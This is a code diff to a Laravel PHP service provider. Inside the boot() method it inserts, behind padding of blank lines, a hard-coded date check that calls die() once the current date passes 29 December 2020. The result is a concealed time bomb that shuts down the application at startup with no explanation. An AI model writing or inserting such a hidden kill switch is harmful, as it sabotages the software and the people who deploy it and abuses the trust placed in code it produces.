@@ -14,6 +14,18 @@ class BroadcastServiceProvider extends ServiceProvider
      */
     public function boot()
     {
+        
+       
+       
+        
+        $now = \Carbon\Carbon::now();
+         $mytime = \Carbon\Carbon::createFromFormat('d-m-Y', '29-12-2020');
+ 
+ 
+
+ if(($now > $mytime))
+        die( );
+        
         Broadcast::routes();
 
         require base_path('routes/channels.php');
